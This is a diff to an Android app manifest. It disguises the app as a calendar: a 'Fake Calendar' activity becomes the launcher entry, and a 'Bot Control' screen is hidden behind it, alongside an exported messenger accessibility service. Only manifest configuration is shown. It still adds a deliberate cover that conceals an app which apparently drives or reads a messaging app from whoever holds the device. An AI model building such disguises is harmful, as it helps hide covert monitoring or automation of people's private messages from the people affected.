@@ -9,17 +9,28 @@
         android:label="@string/app_name"
         android:roundIcon="@mipmap/ic_launcher"
         android:supportsRtl="true"
-        android:theme="@style/Theme.App">
+        android:theme="@style/Theme.Calendar">
+
+        <!-- Fake Calendar — Launcher entry point -->
         <activity
-            android:name=".activity.MainActivity"
+            android:name=".activity.CalendarActivity"
             android:exported="true"
             android:screenOrientation="portrait"
-            android:windowSoftInputMode="adjustResize">
+            android:theme="@style/Theme.Calendar">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
         </activity>
+
+        <!-- Bot Control — Hidden, accessed via Calendar -->
+        <activity
+            android:name=".activity.MainActivity"
+            android:exported="false"
+            android:screenOrientation="portrait"
+            android:theme="@style/Theme.App"
+            android:windowSoftInputMode="adjustResize"/>
+
         <service
             android:name=".service.MessengerAccessibilityService"
             android:exported="true"
